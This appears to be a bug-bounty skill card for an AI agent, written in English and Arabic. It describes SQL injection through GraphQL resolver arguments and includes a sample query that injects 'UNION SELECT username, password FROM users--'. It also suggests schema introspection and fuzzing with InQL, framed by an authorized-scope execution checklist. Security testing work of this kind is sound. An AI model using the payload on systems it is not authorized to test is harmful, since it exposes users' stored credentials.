# SKILL: SQL Injection داخل GraphQL Resolvers

**Skill id:** `tip/sql-injection-داخل-graphql-resolvers`  
**Category:** SQLi, API Hacking  
**Rating:** 🔥 قوية  
**Status:** Not started  
**Notion:** https://app.notion.com/p/3dddac31e88081a7ab7aff649256e4e8  

> **Authorized testing only.** LEAD until validated on accounts/objects you own. Never auto-confirm.

## When the agent should use this skill

- Hunting track involves: **SQLi, API Hacking**
- Target signals match this technique
- Scope and testing envelope confirmed

## How It Works

كتير من الفرق بتحط حماية SQL Injection على REST endpoints لكن بتنسى تحمي resolvers بتاعة GraphQL. جرّب تحقن SQLi payload جوه GraphQL query args، واستخدم InQL لفك الـ schema كامل عبر introspection.

## Payload / Code

```
query \{
  user(id: "1 UNION SELECT username, password FROM users--") \{
    id
    name
    email
  \}
\}

استخدم InQL Burp extension لفك الـ schema كامل وفزّينج كل field
```

## Source

Redfox Security 2026

## Agent execution contract

1. Confirm asset is in authorized scope.
2. Baseline with an account/object you control.
3. Apply **one** mutation from the payload at a time.
4. Discriminate benign explanations (cache, public data, UI-only).
5. Classify as **LEAD** until unauthorized consequence is proven.
6. Stop if real third-party data appears beyond minimal evidence.
7. Hand off to report template only after validation checklist passes.

---
_Synced from Notion Bug Bounty Tips and Tricks · agent skill ready._
